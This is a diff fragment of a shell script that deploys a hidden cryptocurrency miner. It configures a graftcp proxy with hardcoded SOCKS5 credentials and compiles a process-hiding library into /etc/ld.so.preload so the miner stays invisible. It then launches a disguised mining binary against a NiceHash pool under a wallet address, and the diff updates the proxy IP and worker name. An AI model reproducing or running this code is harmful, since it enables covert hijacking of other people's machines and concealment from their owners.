@@ -11,7 +11,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233 
 loglevel = 1 
-socks5 = 52.15.235.202:1080
+socks5 = 143.198.171.112:1080
 socks5_username = mikrotik999 
 socks5_password = Elibawnos 
 END
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:33353 --user 36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.A --ethstratum ETHPROXY
+./graftcp/graftcp ./bezzHash --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:33353 --user 36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.A1 --ethstratum ETHPROXY
